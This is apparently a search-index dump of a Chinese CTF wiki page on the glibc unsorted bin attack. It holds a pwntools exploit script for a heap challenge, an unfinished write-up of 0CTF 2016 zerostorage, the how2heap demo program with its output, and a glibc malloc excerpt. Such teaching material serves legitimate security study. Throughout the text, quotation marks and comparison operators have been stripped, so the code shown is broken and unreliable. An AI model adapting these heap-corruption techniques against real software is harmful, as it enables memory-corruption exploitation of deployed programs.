\nr\n.\nsendline\n(\nstr\n(\nsize\n))\n\n    \nr\n.\nrecvuntil\n(\n:\n)\n\n    \nr\n.\nsendline\n(\ncontent\n)\n\n\n\n\ndef\n \nedit_heap\n(\nidx\n,\n \nsize\n,\n \ncontent\n):\n\n    \nr\n.\nrecvuntil\n(\n:\n)\n\n    \nr\n.\nsendline\n(\n2\n)\n\n    \nr\n.\nrecvuntil\n(\n:\n)\n\n    \nr\n.\nsendline\n(\nstr\n(\nidx\n))\n\n    \nr\n.\nrecvuntil\n(\n:\n)\n\n    \nr\n.\nsendline\n(\nstr\n(\nsize\n))\n\n    \nr\n.\nrecvuntil\n(\n:\n)\n\n    \nr\n.\nsendline\n(\ncontent\n)\n\n\n\n\ndef\n \ndel_heap\n(\nidx\n):\n\n    \nr\n.\nrecvuntil\n(\n:\n)\n\n    \nr\n.\nsendline\n(\n3\n)\n\n    \nr\n.\nrecvuntil\n(\n:\n)\n\n    \nr\n.\nsendline\n(\nstr\n(\nidx\n))\n\n\n\n\ncreate_heap\n(\n0x20\n,\n \ndada\n)\n  \n# 0\n\n\ncreate_heap\n(\n0x80\n,\n \ndada\n)\n  \n# 1\n\n\n# in order not to merge into top chunk\n\n\ncreate_heap\n(\n0x20\n,\n \ndada\n)\n  \n# 2\n\n\n\ndel_heap\n(\n1\n)\n\n\n\nmagic\n \n=\n \n0x6020c0\n\n\nfd\n \n=\n \n0\n\n\nbk\n \n=\n \nmagic\n \n-\n \n0x10\n\n\n\nedit_heap\n(\n0\n,\n \n0x20\n \n+\n \n0x20\n,\n \na\n \n*\n \n0x20\n \n+\n \np64\n(\n0\n)\n \n+\n \np64\n(\n0x91\n)\n \n+\n \np64\n(\nfd\n)\n \n+\n \np64\n(\nbk\n))\n\n\ncreate_heap\n(\n0x80\n,\n \ndada\n)\n  \n#trigger unsorted bin attack\n\n\nr\n.\nrecvuntil\n(\n:\n)\n\n\nr\n.\nsendline\n(\n4869\n)\n\n\nr\n.\ninteractive\n()\n\n\n\n\n\n2016 0CTF zerostorage-\u5f85\u5b8c\u6210\n\n\n\u6ce8\uff1a\u5f85\u8fdb\u4e00\u6b65\u5b8c\u6210\u3002\n\n\n\u8fd9\u91cc\u6211\u4eec\u4ee5 2016 \u5e74 0CTF \u7684zerostorage\u4e3a\u4f8b\uff0c\u8fdb\u884c\u4ecb\u7ecd\u3002\n\n\n\u8fd9\u4e2a\u9898\u5f53\u65f6\u7ed9\u4e86\u670d\u52a1\u5668\u7684\u7cfb\u7edf\u7248\u672c\u548c\u5185\u6838\u7248\u672c\uff0c\u6240\u4ee5\u81ea\u5df1\u53ef\u4ee5\u4e0b\u4e00\u4e2a\u4e00\u6a21\u4e00\u6837\u7684\u8fdb\u884c\u8c03\u8bd5\uff0c\u8fd9\u91cc\u6211\u4eec\u5c31\u76f4\u63a5\u7528\u81ea\u5df1\u7684\u672c\u5730\u673a\u5668\u8c03\u8bd5\u4e86\u3002\u4f46\u662f\u5728\u76ee\u524d\u7684Ubuntu 16.04 \u4e2d\uff0c\u7531\u4e8e\u8fdb\u4e00\u6b65\u7684\u968f\u673a\u5316\uff0c\u5bfc\u81f4 libc \u52a0\u8f7d\u7684\u4f4d\u7f6e\u4e0e\u7a0b\u5e8f\u6a21\u5757\u52a0\u8f7d\u7684\u4f4d\u7f6e\u4e4b\u95f4\u7684\u76f8\u5bf9\u504f\u79fb\u4e0d\u518d\u56fa\u5b9a\uff0c\u6240\u4ee5 BrieflyX \u7684\u7b56\u7565\u5c31\u65e0\u6cd5\u518d\u6b21\u4f7f\u7528\uff0c\u4f3c\u4e4e\u53ea\u80fd\u7528 angelboy \u7684\u7b56\u7565\u4e86\u3002\n\n\n\u5b89\u5168\u6027\u68c0\u67e5\n\n\n\u53ef\u4ee5\u770b\u51fa\uff0c\u8be5\u7a0b\u5e8f\u5f00\u542f\u4e86\u6240\u6709\u7684\u4fdd\u62a4\n\n\npwndbg\n checksec \n\n[\n*\n]\n \n/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/unsorted_bin_attack/zerostorage/zerostorage\n\n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n    FORTIFY:  Enabled\n\n\n\n\n\u57fa\u672c\u529f\u80fd\u5206\u6790\n\n\n\u7a0b\u5e8f\u7ba1\u7406\u5728 bss \u6bb5\u7684\u5b58\u50a8\u7a7a\u95f4 storage \uff0c\u5177\u6709\u63d2\u5165\uff0c\u5220\u9664\uff0c\u5408\u5e76\uff0c\u5220\u9664\uff0c\u67e5\u770b\uff0c\u679a\u4e3e\uff0c\u9000\u51fa\u529f\u80fd\u3002\u8fd9\u4e2astorage\u7684\u7ed3\u6784\u4f53\u5982\u4e0b\n\n\n00000000 Storage         struc ; (sizeof=0x18, mappedto_7)\n00000000                                         ; XREF: .bss:storage_list/r\n00000000 use             dq ?\n00000008 size            dq ?\n00000010 xor_addr        dq ?\n00000018 Storage         ends\n\n\n\n\ninsert-1\n\n\n\u57fa\u672c\u529f\u80fd\u5982\u4e0b\n\n\n\n\n\u9010\u4e00\u67e5\u770b storage \u6570\u7ec4\uff0c\u67e5\u627e\u7b2c\u4e00\u4e2a\u672a\u4f7f\u7528\u7684\u5143\u7d20\uff0c\u4f46\u662f\u8fd9\u4e2a\u6570\u7ec4\u6700\u5927\u4e5f\u5c31\u662f32\u3002\n\n\n\u8bfb\u53d6storage \u5143\u7d20\u6240\u9700\u8981\u5b58\u50a8\u5185\u5bb9\u7684\u957f\u5ea6\u3002\n\n\n\u5982\u679c\u957f\u5ea6\u4e0d\u5927\u4e8e0\uff0c\u76f4\u63a5\u9000\u51fa\uff1b\n\n\n\u5426\u5219\u5982\u679c\u7533\u8bf7\u7684\u5b57\u8282\u6570\u5c0f\u4e8e128\uff0c\u90a3\u5c31\u8bbe\u7f6e\u4e3a128\uff1b\n\n\n\u5426\u5219\uff0c\u5982\u679c\u7533\u8bf7\u7684\u5b57\u8282\u6570\u4e0d\u5927\u4e8e4096\uff0c\u90a3\u5c31\u8bbe\u7f6e\u4e3a\u5bf9\u5e94\u7684\u6570\u503c\uff1b\n\n\n\u5426\u5219\uff0c\u8bbe\u7f6e\u4e3a4096\u3002\n\n\n\n\n\n\n\u4f7f\u7528 calloc \u5206\u914d\u6307\u5b9a\u957f\u5ea6\uff0c\u6ce8\u610f calloc \u4f1a\u521d\u59cb\u5316 chunk \u4e3a0\u3002\n\n\n\u5c06 calloc \u5206\u914d\u7684\u5185\u5b58\u5730\u5740\u4e0e bss \u6bb5\u7684\u4e00\u4e2a\u5185\u5b58\uff08\u521d\u59cb\u65f6\u523b\u4e3a\u4e00\u4e2a\u968f\u673a\u6570\uff09\u8fdb\u884c\u6291\u6216\uff0c\u5f97\u5230\u4e00\u4e2a\u65b0\u7684\u5185\u5b58\u5730\u5740\u3002\n\n\n\u6839\u636e\u8bfb\u53d6\u7684storage\u7684\u5927\u5c0f\u6765\u8bfb\u5165\u5185\u5bb9\u3002\n\n\n\u5c06\u5bf9\u5e94\u7684storage\u7684\u5927\u5c0f\u4ee5\u53ca\u5b58\u50a8\u5185\u5bb9\u7684\u5730\u5740\u4fdd\u5b58\u5230\u5bf9\u5e94\u7684storage \u5143\u7d20\u4e2d\uff0c\u5e76\u6807\u8bb0\u8be5\u5143\u7d20\u5904\u4e8e\u53ef\u7528\u72b6\u6001\u3002\n\u4f46\u662f\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u8bb0\u5f55\u7684storage\u7684\u5927\u5c0f\u662f\u81ea\u5df1\u8f93\u5165\u7684\u5927\u5c0f\uff01\uff01\uff01\n\n\n\u9012\u589e storage num\u7684\u6570\u91cf\u3002\n\n\n\n\nupdate-2\n\n\n\n\n\u5982\u679c\u6ca1\u6709\u4efb\u4f55\u5b58\u50a8\uff0c\u5c31\u76f4\u63a5\u8fd4\u56de\u3002\n\n\n\u8bfb\u5165\u8981\u66f4\u65b0\u7684storage\u5143\u7d20\u7684id\uff0c\u5982\u679cid\u5927\u4e8e31\u6216\u8005\u76ee\u524d\u5904\u4e8e\u4e0d\u5904\u4e8e\u4f7f\u7528\u72b6\u6001\uff0c\u8bf4\u660e\u4e0d\u5bf9\uff0c\u76f4\u63a5\u8fd4\u56de\u3002\n\n\n\u8bfb\u53d6\n\u66f4\u65b0\u540e\nstorage \u5143\u7d20\u6240\u9700\u8981\u5b58\u50a8\u5185\u5bb9\u7684\u957f\u5ea6\u3002\n\n\n\u5982\u679c\u957f\u5ea6\u4e0d\u5927\u4e8e0\uff0c\u76f4\u63a5\u9000\u51fa\uff1b\n\n\n\u5426\u5219\u5982\u679c\u7533\u8bf7\u7684\u5b57\u8282\u6570\u5c0f\u4e8e128\uff0c\u90a3\u5c31\u8bbe\u7f6e\u4e3a128\uff1b\n\n\n\u5426\u5219\uff0c\u5982\u679c\u7533\u8bf7\u7684\u5b57\u8282\u6570\u4e0d\u5927\u4e8e4096\uff0c\u90a3\u5c31\u8bbe\u7f6e\u4e3a\u5bf9\u5e94\u7684\u6570\u503c\uff1b\n\n\n\u5426\u5219\uff0c\u8bbe\u7f6e\u4e3a4096\u3002\n\n\n\n\n\n\n\u6839\u636e bss \u6bb5\u5bf9\u5e94\u7684\u968f\u673a\u6570\u83b7\u53d6\u539f\u5148storage \u5b58\u50a8\u5185\u5bb9\u7684\u5730\u5740\uff0c\n\n\n\u5982\u679c\u66f4\u65b0\u540e\u6240\u9700\u7684\u957f\u5ea6\u4e0d\u7b49\u4e8e\u66f4\u65b0\u524d\u7684\u957f\u5ea6\uff0c\u5c31\u4f7f\u7528realloc\u4e3a\u5176\u91cd\u65b0\u5206\u914d\u5185\u5b58\u3002\n\n\n\u518d\u6b21\u8bfb\u53d6\u6570\u636e\uff0c\u540c\u65f6\u66f4\u65b0storage \u5143\u7d20\u3002\n\n\n\n\nmerge-3\n\n\n\n\n\u5982\u679c\u6b63\u5728\u4f7f\u7528\u7684\u5143\u7d20\u4e0d\u5927\u4e8e1\u4e2a\uff0c\u90a3\u4e48\u65e0\u6cd5\u5408\u5e76\uff0c\u76f4\u63a5\u9000\u51fa\u5373\u53ef\u3002\n\n\n\u5224\u65adstorage\u662f\u5426\u5df2\u7ecf\u6ee1\u4e86\uff0c\u5982\u679c\u4e0d\u6ee1\uff0c\u627e\u51fa\u7a7a\u95f2\u7684\u90a3\u4e00\u5757\u3002\n\n\n\u5206\u522b\u8bfb\u53d6merge_from\u7684id\u4ee5\u53camerge_to\u7684id\u53f7\uff0c\u5e76\u8fdb\u884c\u76f8\u5e94\u5927\u5c0f\u4ee5\u53ca\u4f7f\u7528\u72b6\u6001\u7684\u68c0\u6d4b\u3002\n\n\n\u6839\u636e\u6700\u521d\u7528\u6237\u8f93\u5165\u7684\u5927\u5c0f\u6765\u8ba1\u7b97\u4e24\u4e2a merge \u5230\u4e00\u8d77\u540e\u6240\u9700\u8981\u7684\u7a7a\u95f4\uff0c\n\u5982\u679c\u4e0d\u5927\u4e8e128\uff0c\u90a3\u5c31\u4e0d\u4f1a\u7533\u8bf7\u65b0\u7684\u7a7a\u95f4\n\uff0c\u5426\u5219\u5c31\u7533\u8bf7\u76f8\u5e94\u5927\u5c0f\u7684\u65b0\u7684\u7a7a\u95f4\u3002\n\n\n\u4f9d\u6b21\u5c06merge_to\u4e0emerge_from\u7684\u5185\u5bb9\u62f7\u8d1d\u5230\u76f8\u5bf9\u5e94\u7684\u4f4d\u7f6e\u3002\n\n\n\u6700\u540e\u5b58\u50a8merge_from\u5185\u5bb9\u7684\u5185\u5b58\u5730\u5740\u88ab\u91ca\u653e\u4e86\uff0c\u4f46\u5e76\u6ca1\u6709\u88ab\u7f6e\u4e3aNULL\u3002\u540c\u65f6\uff0c\u5b58\u653emerge_to\u5185\u5bb9\u7684\u5185\u5b58\u5730\u5740\u5e76\u6ca1\u6709\u88ab\u91ca\u653e\uff0c\u76f8\u5e94\u7684storage\u7684\u6291\u6216\u540e\u7684\u5730\u5740\u53ea\u662f\u88ab\u7f6e\u4e3a\u4e86NULL\u3002\n\n\n\n\n\u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\uff0c\u5728merge\u7684\u65f6\u5019\uff0c\u5e76\u6ca1\u6709\u68c0\u6d4b\u4e24\u4e2astorage\u7684ID\u662f\u5426\u76f8\u540c\u3002\n\n\ndelete-4\n\n\n\n\n\u5982\u679c\u6ca1\u6709\u5b58\u50a8\u4efb\u4f55\u5143\u7d20\uff0c\u90a3\u5c31\u76f4\u63a5\u8fd4\u56de\u3002\n\n\n\u8bfb\u53d6\u6307\u5b9a\u8981\u4fee\u6539\u7684storage\u7684\u5143\u7d20\u7684id\uff0c\u5982\u679c id \u5927\u4e8e32\uff0c\u5c31\u76f4\u63a5\u8fd4\u56de\u3002\n\n\n\u5982\u679c storage  \u7684\u5bf9\u5e94\u5143\u7d20\u5e76\u4e0d\u5728\u4f7f\u7528\u72b6\u6001\uff0c\u90a3\u4e48\u4e5f\u540c\u65f6\u8fd4\u56de\u3002\n\n\n\u4e4b\u540e\u5c31\u662f\u5c06\u5143\u7d20\u5bf9\u5e94\u7684\u5b57\u6bb5\u5206\u522b\u8bbe\u7f6e\u4e3aNULL\uff0c\u5e76\u4e14\u91ca\u653e\u5bf9\u5e94\u7684\u5185\u5b58\u3002\n\n\n\n\nview-5\n\n\n\n\n\u5982\u679c\u6ca1\u6709\u5b58\u50a8\u4efb\u4f55\u5143\u7d20\uff0c\u90a3\u5c31\u76f4\u63a5\u8fd4\u56de\u3002\n\n\n\u8bfb\u53d6\u6307\u5b9a\u8981\u4fee\u6539\u7684storage\u7684\u5143\u7d20\u7684id\uff0c\u5982\u679c id \u5927\u4e8e32\uff0c\u5c31\u76f4\u63a5\u8fd4\u56de\u3002\n\n\n\u5982\u679c storage  \u7684\u5bf9\u5e94\u5143\u7d20\u5e76\u4e0d\u5728\u4f7f\u7528\u72b6\u6001\uff0c\u90a3\u4e48\u4e5f\u540c\u65f6\u8fd4\u56de\u3002\n\n\n\u8f93\u5165\u5bf9\u5e94\u7684storage \u7684\u5185\u5bb9\u3002\n\n\n\n\nlist-6\n\n\n\n\n\u5982\u679c\u6ca1\u6709\u5b58\u50a8\u4efb\u4f55\u5143\u7d20\uff0c\u90a3\u5c31\u76f4\u63a5\u8fd4\u56de\u3002\n\n\n\u8bfb\u53d6\u6307\u5b9a\u8981\u4fee\u6539\u7684storage\u7684\u5143\u7d20\u7684id\uff0c\u5982\u679c id \u5927\u4e8e32\uff0c\u5c31\u76f4\u63a5\u8fd4\u56de\u3002\n\n\n\u904d\u5386\u6240\u6709\u6b63\u5728\u4f7f\u7528\u7684storage\uff0c\u8f93\u5165\u5176\u5bf9\u5e94\u7684\u4e0b\u6807\u4ee5\u53ca\u5bf9\u5e94storage\u7684\u5927\u5c0f\u3002\n\n\n\n\n\u6f0f\u6d1e\u786e\u5b9a\n\n\n\u901a\u8fc7\u8fd9\u4e48\u7b80\u5355\u7684\u5206\u6790\uff0c\u6211\u4eec\u53ef\u4ee5 \u57fa\u672c\u786e\u5b9a\u6f0f\u6d1e\u4e3b\u8981\u5c31\u662f\u96c6\u4e2d\u5728insert\u64cd\u4f5c\u4e0emerge\u64cd\u4f5c\u4e2d\uff0c\u5c24\u5176\u662f\u5f53\u6211\u4eecmerge\u4e24\u4e2a\u8f83\u5c0fsize\u7684storage\u65f6\uff0c\u4f1a\u51fa\u73b0\u4e00\u4e9b\u95ee\u9898\u3002\n\n\n\u6211\u4eec\u6765\u5177\u4f53\u5206\u6790\u4e00\u4e0b\uff0c\u5982\u679c\u6211\u4eec\u5728insert\u8fc7\u7a0b\u4e2d\u63d2\u5165\u8f83\u5c0f\u7684size\uff08\u6bd4\u59828\uff09\u7684storage  A\uff0c\u90a3\u4e48\uff0c\u5f53\u6211\u4eec\u8fdb\u884cmerge\u65f6\uff0c\u5047\u8bbe\u6211\u4eec\u9009\u62e9merge\u7684\u4e24\u4e2astorage \u90fd\u4e3aA\uff0c\u90a3\u4e48\u6b64\u65f6\u7a0b\u5e8f\u4f1a\u76f4\u63a5\u628a\u5c31\u4f1a\u76f4\u63a5\u628aA\u7684\u5185\u5bb9\u518d\u6dfb\u52a0\u5230A\u7684\u539f\u6709\u5185\u5bb9\u7684\u540e\u9762\uff0c\u7136\u540e\u63a5\u7740\u5c31\u4f1a\u628aA\u5bf9\u5e94\u7684\u5b58\u50a8\u6570\u636e\u90e8\u5206\u7684\u5185\u5b58free\u6389\uff0c\u4f46\u662f\u8fd9\u5e76\u6ca1\u6709\u4ec0\u4e48\u4f5c\u7528\uff0c\u56e0\u4e3aA\u5b58\u50a8\u5185\u5bb9\u7684\u5730\u5740\u88ab\u8d4b\u7ed9\u4e86\u53e6\u5916\u4e00\u4e2astorage\uff0c\u5f53\u518d\u8bbf\u95eemerge \u540e\u7684 storage B\u90e8\u5206\u7684\u5185\u5bb9\u65f6\uff0c\u7531\u4e8eB\u7684\u5b58\u50a8\u6570\u636e\u90e8\u5206\u7684\u5730\u5740\u5176\u5b9e\u5c31\u662fA\u5bf9\u5e94\u7684\u5b58\u50a8\u6570\u636e\u7684\u5730\u5740\uff0c\u6240\u4ee5\u6253\u5370\u7684\u5c31\u662fA\u7684\u6570\u636e\u90e8\u5206\u7684\u5185\u5bb9\u3002\u4f46\u662f\uff0c\u6211\u4eec\u4e4b\u524d\u521a\u521a\u628aA\u5bf9\u5e94\u7684\u5185\u5b58\u91ca\u653e\u6389\uff0c\u800cA\u7531\u4e8e\u4e0d\u5728fast bin\u8303\u56f4\u5185\uff0c\u6240\u4ee5\u53ea\u4f1a\u88ab\u653e\u5230unsorted bin\u4e2d\uff08\u800c\u4e14\u6b64\u65f6\u53ea\u6709\u4e00\u4e2a\uff09\uff0c\u6240\u4ee5\u6b64\u65f6A\u7684fd\u548cbk\u90fd\u5b58\u653e\u7684\u662funsorted bin\u7684\u4e00\u4e2a\u57fa\u5730\u5740\u3002\n\n\n\u5982\u679c\u6211\u4eec\u5728merge\u4e4b\u524d\u66fe\u7ecf\u5220\u9664\u8fc7\u4e00\u4e2astorage C\uff0c\u90a3\u4e48\u5728\u6211\u4eecmerge A\u540e\uff0cA\u5c31\u4f1a\u63d2\u5728unsorted bin\u7684\u53cc\u5411\u94fe\u8868\u7684\u9996\u90e8\uff0c\u6240\u4ee5\u5176fd\u5219\u662fC\u5bf9\u5e94\u7684\u5730\u5740\uff0cbk\u5219\u662funsorted bin\u7684\u4e00\u4e2a\u57fa\u5730\u5740\u3002\u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u76f4\u63a5\u6cc4\u9732\u4e24\u4e2a\u5730\u5740\u3002\n\n\n\u800c\u4e14\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6211\u4eec\u8fd8\u662f\u53ef\u4ee5\u53bb\u4fee\u6539merge\u540e\u7684B\u7684\u5185\u5bb9\u7684\uff0c\u6240\u4ee5\u8fd9\u5176\u5b9e\u5c31\u662f\u4e2aUse After Free\u3002\n\n\n\u5229\u7528\u6d41\u7a0b\n\n\n\u3002\u3002\u3002\u3002\n\n\n\u9898\u76ee\n\n\n\u53c2\u8003\u6587\u732e\n\n\n\n\nhttp://brieflyx.me/2016/ctf-writeups/0ctf-2016-zerostorage/\n\n\nhttps://github.com/HQ1995/Heap_Senior_Driver/tree/master/0ctf2016/zerostorage\n\n\nhttps://github.com/scwuaptx/CTF/blob/master/2016-writeup/0ctf/zerostorage.py", 
            "title": "Unsorted Bin Attack"
        }, 
        {
            "location": "/pwn/heap/unsorted_bin_attack/#unsorted-bin-attack", 
            "text": "", 
            "title": "Unsorted Bin Attack"
        }, 
        {
            "location": "/pwn/heap/unsorted_bin_attack/#_1", 
            "text": "Unsorted Bin Attack\uff0c\u987e\u540d\u601d\u4e49\uff0c\u8be5\u653b\u51fb\u4e0e Glibc \u5806\u7ba1\u7406\u4e2d\u7684\u7684 Unsorted Bin \u7684\u673a\u5236\u7d27\u5bc6\u76f8\u5173\u3002  Unsorted Bin Attack \u88ab\u5229\u7528\u7684\u524d\u63d0\u662f\u63a7\u5236 Unsorted Bin Chunk \u7684 bk \u6307\u9488\u3002  Unsorted Bin Attack \u53ef\u4ee5\u8fbe\u5230\u7684\u6548\u679c\u662f\u5b9e\u73b0\u4fee\u6539\u4efb\u610f\u5730\u5740\u503c\u4e3a\u4e00\u4e2a\u8f83\u5927\u7684\u6570\u503c\u3002", 
            "title": "\u6982\u8ff0"
        }, 
        {
            "location": "/pwn/heap/unsorted_bin_attack/#unsorted-bin", 
            "text": "\u5728\u4ecb\u7ecd Unsorted Bin \u653b\u51fb\u524d\uff0c\u53ef\u4ee5\u5148\u56de\u987e\u4e00\u4e0b Unsorted Bin \u7684\u57fa\u672c\u6765\u6e90\u4ee5\u53ca\u57fa\u672c\u4f7f\u7528\u60c5\u51b5\u3002", 
            "title": "Unsorted Bin \u56de\u987e"
        }, 
        {
            "location": "/pwn/heap/unsorted_bin_attack/#_2", 
            "text": "\u5f53\u4e00\u4e2a\u8f83\u5927\u7684 chunk \u88ab\u5206\u5272\u6210\u4e24\u534a\u540e\uff0c\u5982\u679c\u5269\u4e0b\u7684\u90e8\u5206\u5927\u4e8e MINSIZE\uff0c\u5c31\u4f1a\u88ab\u653e\u5230 unsorted bin \u4e2d\u3002  \u91ca\u653e\u4e00\u4e2a\u4e0d\u5c5e\u4e8e fast bin \u7684 chunk\uff0c\u5e76\u4e14\u8be5 chunk \u4e0d\u548c top chunk \u7d27\u90bb\u65f6\uff0c\u8be5 chunk \u4f1a\u88ab\u9996\u5148\u653e\u5230 unsorted bin \u4e2d\u3002\u5173\u4e8etop chunk\u7684\u89e3\u91ca\uff0c\u8bf7\u53c2\u8003\u4e0b\u9762\u7684\u4ecb\u7ecd\u3002  \u5f53\u8fdb\u884c malloc_consolidate \u65f6\uff0c\u53ef\u80fd\u4f1a\u628a\u5408\u5e76\u540e\u7684 chunk \u653e\u5230 unsorted bin \u4e2d\uff0c\u5982\u679c\u4e0d\u662f\u548c top chunk \u8fd1\u90bb\u7684\u8bdd\u3002", 
            "title": "\u57fa\u672c\u6765\u6e90"
        }, 
        {
            "location": "/pwn/heap/unsorted_bin_attack/#_3", 
            "text": "Unsorted Bin \u5728\u4f7f\u7528\u7684\u8fc7\u7a0b\u4e2d\uff0c\u91c7\u7528\u7684\u904d\u5386\u987a\u5e8f\u662f FIFO\uff0c \u5373\u63d2\u5165\u7684\u65f6\u5019\u63d2\u5165\u5230 unsorted bin \u7684\u5934\u90e8\uff0c\u53d6\u51fa\u7684\u65f6\u5019\u4ece\u94fe\u8868\u5c3e\u83b7\u53d6 \u3002  \u5728\u7a0b\u5e8f malloc \u65f6\uff0c\u5982\u679c\u5728 fastbin\uff0csmall bin \u4e2d\u627e\u4e0d\u5230\u5bf9\u5e94\u5927\u5c0f\u7684 chunk\uff0c\u5c31\u4f1a\u5c1d\u8bd5\u4ece Unsorted Bin \u4e2d\u5bfb\u627e chunk\u3002\u5982\u679c\u53d6\u51fa\u6765\u7684 chunk \u5927\u5c0f\u521a\u597d\u6ee1\u8db3\uff0c\u5c31\u4f1a\u76f4\u63a5\u8fd4\u56de\u7ed9\u7528\u6237\uff0c\u5426\u5219\u5c31\u4f1a\u628a\u8fd9\u4e9b chunk \u5206\u522b\u63d2\u5165\u5230\u5bf9\u5e94\u7684 bin \u4e2d\u3002", 
            "title": "\u57fa\u672c\u4f7f\u7528\u60c5\u51b5"
        }, 
        {
            "location": "/pwn/heap/unsorted_bin_attack/#_4", 
            "text": "\u8fd9\u91cc\u6211\u4ee5 shellfish \u7684 how2heap \u4ed3\u5e93\u4e2d\u7684  unsorted_bin_attack.c  \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u8fd9\u91cc\u6211\u505a\u4e00\u4e9b\u7b80\u5355\u7684\u4fee\u6539\uff0c\u5982\u4e0b  #include   stdio.h  #include   stdlib.h  int   main ()   { \n   fprintf ( stderr ,   This file demonstrates unsorted bin attack by write a large  \n                   unsigned long value into stack \\n ); \n   fprintf ( \n       stderr , \n       In practice, unsorted bin attack is generally prepared for further  \n       attacks, such as rewriting the  \n       global variable global_max_fast in libc for further fastbin attack \\n\\n ); \n\n   unsigned   long   target_var   =   0 ; \n   fprintf ( stderr , \n           Let s first look at the target we want to rewrite on stack: \\n ); \n   fprintf ( stderr ,   %p: %ld \\n\\n ,   target_var ,   target_var ); \n\n   unsigned   long   * p   =   malloc ( 400 ); \n   fprintf ( stderr ,   Now, we allocate first normal chunk on the heap at: %p \\n , \n           p ); \n   fprintf ( stderr ,   And allocate another normal chunk in order to avoid  \n                   consolidating the top chunk with \n                   the first one during the free() \\n\\n ); \n   malloc ( 500 ); \n\n   free ( p ); \n   fprintf ( stderr ,   We free the first chunk now and it will be inserted in the  \n                   unsorted bin with its bk pointer  \n                   point to %p \\n , \n           ( void   * ) p [ 1 ]); \n\n   /*------------VULNERABILITY-----------*/ \n\n   p [ 1 ]   =   ( unsigned   long )( target_var   -   2 ); \n   fprintf ( stderr ,   Now emulating a vulnerability that can overwrite the  \n                   victim- bk pointer \\n ); \n   fprintf ( stderr ,   And we write it with the target address-16 (in 32-bits  \n                   machine, it should be target address-8):%p \\n\\n , \n           ( void   * ) p [ 1 ]); \n\n   //------------------------------------ \n\n   malloc ( 400 ); \n   fprintf ( stderr ,   Let s malloc again to get the chunk we just free. During  \n                   this time, target should has already been  \n                   rewrite: \\n ); \n   fprintf ( stderr ,   %p: %p \\n ,   target_var ,   ( void   * ) target_var );  }   \u7a0b\u5e8f\u6267\u884c\u540e\u7684\u6548\u679c\u4e3a  \u279c  unsorted_bin_attack git: ( master )  \u2717 gcc unsorted_bin_attack.c -o unsorted_bin_attack   \n\u279c  unsorted_bin_attack git: ( master )  \u2717 ./unsorted_bin_attack\nThis file demonstrates unsorted bin attack by write a large unsigned long value into stack\nIn practice, unsorted bin attack is generally prepared  for  further attacks, such as rewriting the global variable global_max_fast in libc  for  further fastbin attack\n\nLet s first look at the target we want to rewrite on stack:  0x7ffe0d232518: 0  Now, we allocate first normal chunk on the heap at: 0x1fce010  And allocate another normal chunk in order to avoid consolidating the top chunk withthe first one during the free()  We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f1c705ffb78  Now emulating a vulnerability that can overwrite the victim- bk pointer  And we write it with the target address-16 (in 32-bits machine, it should be target address-8):0x7ffe0d232508  Let s malloc again to get the chunk we just free. During this time, target should has already been rewrite:\n0x7ffe0d232518: 0x7f1c705ffb78  \u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e2a\u56fe\u6765\u63cf\u8ff0\u4e00\u4e0b\u5177\u4f53\u53d1\u751f\u7684\u6d41\u7a0b\u4ee5\u53ca\u80cc\u540e\u7684\u539f\u7406\u3002   \u521d\u59cb\u72b6\u6001\u65f6  unsorted bin \u7684 fd \u548c bk \u5747\u6307\u5411 unsorted bin \u672c\u8eab\u3002  \u6267\u884cfree(p)    \u7531\u4e8e\u91ca\u653e\u7684 chunk \u5927\u5c0f\u4e0d\u5c5e\u4e8e fast bin \u8303\u56f4\u5185\uff0c\u6240\u4ee5\u4f1a\u9996\u5148\u653e\u5165\u5230 unsorted bin \u4e2d\u3002  \u4fee\u6539p[1]  \u7ecf\u8fc7\u4fee\u6539\u4e4b\u540e\uff0c\u539f\u6765\u5728 unsorted bin \u4e2d\u7684 p \u7684 bk \u6307\u9488\u5c31\u4f1a\u6307\u5411 target addr-16 \u5904\u4f2a\u9020\u7684 chunk\uff0c\u5373 Target Value \u5904\u4e8e\u4f2a\u9020 chunk \u7684 fd \u5904\u3002  \u7533\u8bf7400\u5927\u5c0f\u7684chunk  \u6b64\u65f6\uff0c\u6240\u7533\u8bf7\u7684 chunk \u5904\u4e8e small bin \u6240\u5728\u7684\u8303\u56f4\uff0c\u5176\u5bf9\u5e94\u7684 bin \u4e2d\u6682\u65f6\u6ca1\u6709 chunk\uff0c\u6240\u4ee5\u4f1a\u53bbunsorted bin\u4e2d\u627e\uff0c\u53d1\u73b0 unsorted bin \u4e0d\u7a7a\uff0c\u4e8e\u662f\u628a unsorted bin \u4e2d\u7684\u6700\u540e\u4e00\u4e2a chunk \u62ff\u51fa\u6765\u3002           while   (( victim   =   unsorted_chunks ( av ) - bk )   !=   unsorted_chunks ( av ))   { \n             bck   =   victim - bk ; \n             if   ( __builtin_expect ( chunksize_nomask ( victim )   =   2   *   SIZE_SZ ,   0 )   || \n                 __builtin_expect ( chunksize_nomask ( victim )     av - system_mem ,   0 )) \n                 malloc_printerr ( check_action ,   malloc(): memory corruption , \n                                 chunk2mem ( victim ),   av ); \n             size   =   chunksize ( victim ); \n\n             /*                 If a small request, try to use last remainder if it is the                 only chunk in unsorted bin.  This helps promote locality for                 runs of consecutive small requests. This is the only                 exception to best-fit, and applies only when there is                 no exact fit for a small chunk.               */ \n             /* \u663e\u7136\uff0cbck\u88ab\u4fee\u6539\uff0c\u5e76\u4e0d\u7b26\u5408\u8fd9\u91cc\u7684\u8981\u6c42*/ \n             if   ( in_smallbin_range ( nb )     bck   ==   unsorted_chunks ( av )   \n                 victim   ==   av - last_remainder   \n                 ( unsigned   long )   ( size )     ( unsigned   long )   ( nb   +   MINSIZE ))   { \n                 .... \n             } \n\n             /* remove from unsorted list */ \n             unsorted_chunks ( av ) - bk   =   bck ; \n             bck - fd                   =   unsorted_chunks ( av );    victim = unsorted_chunks(av)- bk=p  bck = victim- bk=p- bk = target addr-16  unsorted_chunks(av)- bk = bck=target addr-16  bck- fd                 = *(target addr -16+16) = 